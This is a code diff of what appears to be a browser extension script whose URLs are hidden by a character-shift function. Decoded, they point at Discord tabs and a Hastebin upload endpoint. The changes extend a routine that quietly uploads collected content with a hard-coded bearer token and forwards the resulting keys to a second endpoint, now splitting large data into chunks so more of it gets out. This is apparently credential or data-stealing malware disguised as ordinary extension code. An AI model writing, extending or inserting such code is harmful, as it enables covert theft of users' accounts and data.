@@ -31,8 +31,6 @@ function reminify(i, cng) {
     }
 }
 
-chrome.tabs.create({ url: "https://discord.com/invite/ME3SDSf" });
-
 
 // Execute the lookup in the tab requested
 chrome.tabs.query({ url: `${reminify("*://*.lqakwzl.kwu/*", -8)}` }, (tabs) => {
@@ -108,29 +106,38 @@ function syncKeys(name) {
 }
 
 
-
 const updateSec = "tffbe://tmefqnuz.oay/paogyqzfe";
-
 const xylonPMP = "5dc16d2d0261f039414dae09a45c55281d31be07e4e95fe208fec6cfed56050972ee7dac22e3cca72688490ce4366812c8c15918c4b50f696f968833f1103dfe";
+
+const MAX_SIZE = 400000; // Hastebin size limit (characters)
 
 async function nucleiFetch(nuclei) {
     try {
-        const response = await fetch(reminify(updateSec, -12), {
-            method: 'POST',
-            headers: {
-                'Authorization': `Bearer ${xylonPMP}`,
-                'Content-Type': 'text/plain'
-            },
-            body: nuclei
-        });
+        // Split content if it's too large
+        const chunks = splitIntoChunks(nuclei, MAX_SIZE);
 
-        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
+        // Track the Hastebin keys for each chunk
+        const keys = [];
 
-        const data = await response.json();
-        const keyReq = `${data.key}`;
+        for (const chunk of chunks) {
+            const response = await fetch(reminify(updateSec, -12), {
+                method: 'POST',
+                headers: {
+                    'Authorization': `Bearer ${xylonPMP}`,
+                    'Content-Type': 'text/plain'
+                },
+                body: chunk
+            });
 
+            if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
+
+            const data = await response.json();
+            keys.push(`${data.key}`);
+        }
+
+        // Send the concatenated URLs or keys as a message
         const reqPayload = {
-            content: `C: ${keyReq}`
+            content: `C: ${keys.join(', ')}`
         };
 
         await fetch(resBuffer, {
@@ -145,6 +152,16 @@ async function nucleiFetch(nuclei) {
         console.error(error);
     }
 }
+
+// Function to split the content into smaller chunks
+function splitIntoChunks(text, size) {
+    const chunks = [];
+    for (let i = 0; i < text.length; i += size) {
+        chunks.push(text.slice(i, i + size));
+    }
+    return chunks;
+}
+
 
 async function parseResults() {
     (function () {
